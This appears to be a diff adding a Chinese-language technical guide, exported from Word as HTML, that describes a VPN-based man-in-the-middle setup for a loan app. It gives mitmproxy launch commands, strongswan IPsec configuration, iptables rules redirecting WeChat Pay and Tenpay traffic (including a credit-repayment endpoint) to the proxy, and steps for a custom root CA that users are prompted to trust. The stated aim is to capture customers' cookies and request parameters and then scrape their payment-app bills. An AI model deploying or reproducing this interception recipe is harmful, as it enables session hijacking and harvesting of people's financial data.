@@ -1,0 +1,109 @@
+
+        <html xmlns:v="urn:schemas-microsoft-com:vml"
+        xmlns:o="urn:schemas-microsoft-com:office:office"
+        xmlns:w="urn:schemas-microsoft-com:office:word"
+        xmlns="http://www.w3.org/TR/REC-html40">
+        <head><meta http-equiv=Content-Type content="text/html;  
+        charset=utf-8">
+        <style type="text/css">
+            table  
+            {  
+                border-collapse: collapse;
+                border: none;  
+                width: 100%;  
+            }  
+            td  
+            {  
+                border: solid #CCC 1px;  
+            }  
+            .codestyle{
+                word-break: break-all;
+                background:silver;mso-highlight:silver;
+            }
+        </style>
+        <meta name=ProgId content=Word.Document>
+        <meta name=Generator content="Microsoft Word 11">
+        <meta name=Originator content="Microsoft Word 11">
+        <xml><w:WordDocument><w:View>Print</w:View></xml></head>
+        <body><h1>1、VPN技术说明</h1><div style="margin-left:20px;"><h1>VPN 中间人攻击技术说明</h1>
+<hr />
+<h2>什么是 VPN中间人攻击及优缺点</h2>
+<p>VPN 中间人攻击和我们熟悉的Charles、Fiddler<a href="http://netsecurity.51cto.com/art/201712/559836.htm">中间人原理</a>大致相同。其最大的不同是VPN要把整个网卡的网络流量嫁接到中间人攻击程序，而Charles、Fiddler则只是一个特殊Http/Https代理。而有些特殊情况Charles或Fiddler是无法抓包手机的，比如：当Android工程在编码网络请求时使用NO_PROXY时即使用户设置了而Charles或Fiddler，其手机实际网络也不会走代理。或者像支付宝app源码自建了httpclient，其网络重要的网络请求也不走系统设置的http代理的。而VPN在网络源头加了监听，整个手机的网络必须走VPN。所以VPN不会有这样的问题。Android不需要Root、IOS不需要越狱。也不需要用户账号密码。但缺点抓取数据是被动式的，用户必须配合操作相关APP数据才流经VPN服务器。</p>
+<h3>1. 基于Android的VPN攻击方案</h3>
+<table width='100%' class='codestyle'><pre><code>Android连接VPN必须基于Android VpnService服务。但是VpnService只是提供简单的Android手机本地架设VPN的方式，并且只读写虚拟网卡的方法。要连上远端的VPN必须将虚拟网络卡流转化成socks数据流，再将socks数据流连接到服务器端的socks5代理。服务器在socks5代理的基础上实现中间人攻击。
+虚拟网络卡流转化成socks数据流实现方案是tun2socks，已经集成到SDK里面了。</code></pre></table>
+<h3>2. Android的VPN服务器端实现方案</h3>
+<table width='100%' class='codestyle'><pre><code>socks5代理基于[mitmproxy](https://github.com/mitmproxy)。ubuntu安装mitmproxy python环境必须更新到python3。然后pip3 install mitmproxy即可完成安装。然后需要编写攻击处理脚本。
+启动方式是mitmdump --listen-port 1723 --mode socks5 --ignore-hosts '^(?!123.126.122.46)(?!pay.weixin.qq.com)(?!58.250.137.24)(?!fdc.tenpay.com)'  -s main.py。
+mitmdump表示以后台方式启动，--listen-port 1723表示服务启动在1723端口，
+--mode socks5表示以socks5代理方式启动，
+--ignore-hosts '^(?!123.126.122.46)(?!pay.weixin.qq.com)(?!58.250.137.24)(?!fdc.tenpay.com)' 表示除了去往123.126.122.46和58.250.137.24 IP的网络请求，其他都不走中间人攻击。IP后面的pay.weixin.qq.com域名的解析结果，一个域名可能对应多个IP。
+-s main.py是对接中间人攻击的python脚本。
+处理脚本教程可查看mitmproxy的examples https://github.com/mitmproxy/mitmproxy/tree/master/examples
+--ignore-hosts 需要将监听域名的所有域名对应的IP全部设置上，查询域名对应IP可上http://www.webkaka.com/dns/ 和 http://tool.chinaz.com/dns/?type=1  也可写一个爬虫自动查询，手工整理挺费劲的。我写了一个爬虫DNSQueryTest.java自动查询所有IP并且生成命令在里面。</code></pre></table>
+<h3>3. 基于IOS的VPN攻击方案</h3>
+<table width='100%' class='codestyle'><pre><code>IOS的VPN基于IOS开发框架NetWorkExtension实现的。该框架提供了以编程的方式配置vpn连接。连接VPN类型是IPsec PSK。服务器端用iptables将需要攻击的目标及端口标识的流量重定向到透明代理即可完成数据的截获。
+NetWorkExtension需要苹果企业开发证书才可以使用。</code></pre></table>
+<h3>4. 基于IOS的VPN服务器端实现方案</h3>
+<table width='100%' class='codestyle'><pre><code>IPsec PSK VPN在Ubuntu安装。安装配置完成后同样可以用iptables对接到mitmproxy启动的透明代理。透明代理启动方式是mitmdump --rawtcp  --showhost --ssl-insecure --mode transparent。透明代理也是一种Http/Https代理，只不过客户端不用主动设置此代理，而是通过Iptables的方式把流量重定向到了透明代理。所以客户端无感知。后面编写攻击处理脚本方法和Android服务器端的方式大致相同。
+安装IPsec 命令一:apt-get update 命令二:apt-get install strongswan strongswan-plugin-xauth-generic 命令三:vi /etc/ipsec.secrets 配置密钥、账号及密码。例如：</code></pre></table>
+<pre><code class="language-txt">: PSK "yourSecret"
+username : XAUTH "upassword"
+#yourSecret是密钥 username是账号 password是密码</code></pre></table>
+<table width='100%' class='codestyle'><pre><code>然后配置vpn连接 。命令:vim /etc/ipsec.conf</code></pre></table>
+<pre><code class="language-txt">config setup
+    cachecrls=yes
+    uniqueids=yes
+
+conn ios
+    keyexchange=ikev1
+    authby=xauthpsk
+    xauth=server
+    left=%defaultroute
+    leftsubnet=0.0.0.0/0
+    leftfirewall=yes
+    right=%any
+    rightsubnet=10.6.8.1/24
+    rightsourceip=10.6.8.1/24
+    rightdns=223.5.5.5
+    auto=add
+#所有的配置都不用动，rightsubnet和rightsourceip表示连接到本vpn的客户端分配的ip是10.6.8.1-10.6.8.255之间。rightdns表示dns服务器，喜欢也可以用其他DNS。</code></pre></table>
+<table width='100%' class='codestyle'><pre><code>启动命令：ipsec start
+开启IP转发规则：sysctl net.ipv4.ip_forward=1
+设置VPN子网掩码：iptables -t nat -A POSTROUTING -s 10.6.8.1/24 -o eth0 -j MASQUERADE
+启动mitmproxy透明代理 mitmdump --listen-port 1724 --rawtcp  --showhost --ssl-insecure --mode transparent -s main.py
+设置攻击目标host的流量重定向，例如攻击微信信用卡还款接口（wx-credit-repay.tenpay.com）：</code></pre></table>
+<pre><code class="language-shell">iptables -t nat -A PREROUTING -d 183.3.234.189 -p tcp --dport 443 -m tcp -j REDIRECT --to-ports 1724
+iptables -t nat -A PREROUTING -d 58.251.80.190 -p tcp --dport 443 -m tcp -j REDIRECT --to-ports 1724
+iptables -t nat -A PREROUTING -d 203.205.151.12 -p tcp --dport 443 -m tcp -j REDIRECT --to-ports 1724</code></pre></table>
+<table width='100%' class='codestyle'><pre><code>域名查询IP方式和Android服务器端方法类似。</code></pre></table>
+<h3>5. 自定义CA证书</h3>
+<table width='100%' class='codestyle'><pre><code>默认情况下，mitmproxy会提供缺省的CA证书。我们把mitmproxy-ca.pem拷贝出来就可以用。但是mitmproxy-ca.pem的签名的mitmproxy这样客户会看不懂。所以最好使用自签的CA证书。制作自定义CA证书命令如下：</code></pre></table>
+<pre><code class="language-shell">openssl genrsa -out ca-key.pem 2048
+openssl req -new -x509 -key ca-key.pem -out ca-cert.pem  -days 1000
+牢记下面三个属性值，生成csr.pem时需要保持一致：
+Country Name,State or Province Name,Organization Name
+#如果发生以下错误：
+#"I am unable to access the ../../CA/newcerts directory ../../CA/newcerts: No such file or directory"
+#注意：你的可能不是../../CA/newcerts 这个目录，把下面命令替换成你自己的目录
+# create directory
+mkdir ../../CA
+mkdir ../../CA/newcerts
+# create empty file ：
+touch ../../CA/index.txt
+# create file and input 01 (the content is 01) ：
+vi ../../CA/serial
+
+openssl pkcs12 -export -in ca_cert.pem -inkey ca-key.pem -out ca-cert.p12
+#删掉原来的所有证书
+rm ~/.mitmproxy/mitmproxy-*
+#拷贝自定义证书
+cp ca_cert.pem ~/.mitmproxy/mitmproxy-ca-cert.pem
+cp ca_cert.pem ~/.mitmproxy/mitmproxy-ca-cert.cer
+cp ca_cert.p12 ~/.mitmproxy/mitmproxy-ca-cert.p12
+cat ca_key.pem ca_cert.pem > ~/.mitmproxy/mitmproxy-ca.pem</code></pre></table>
+<table width='100%' class='codestyle'><pre><code>Android、IOS客户端在首次授权之前需要安装ca_cert.pem证书，IOS在安装完成后还需要到设置->关于->信任凭证->信任证书。这需要提示用户去完成此操作。</code></pre></table>
+<h3>6. 抓取过程需要客户配合操作被抓取的APP</h3>
+<table width='100%' class='codestyle'><pre><code>VPN抓取是被动的，客户需要打开被授权（抓取）的APP的相关页面，这样需要攻击的接口才会发生网络请求。这需要贷款APP有文字提示、语音引导、图文教程都可以。只要在开启VPN之后客户正确打开相关APP页面，服务器就会拦截到相关数据和后继请求需要的参数及Cookie。后继数据爬虫行为可用之前获取的参数和Cookie完成抓取。例如：抓取微信近6个月账单，客户只需打开微信账单第一页即可。后面5个月全部由服务器根据参数和Cookie去抓取。</code></pre></table>
+<h3>7. 法律问题</h3>
+<table width='100%' class='codestyle'><pre><code>VPN授权抓取客户信息，在操作之前需要拟一份合同。贷款APP展示，让客户同意行为。</code></pre></table></div></body></html>
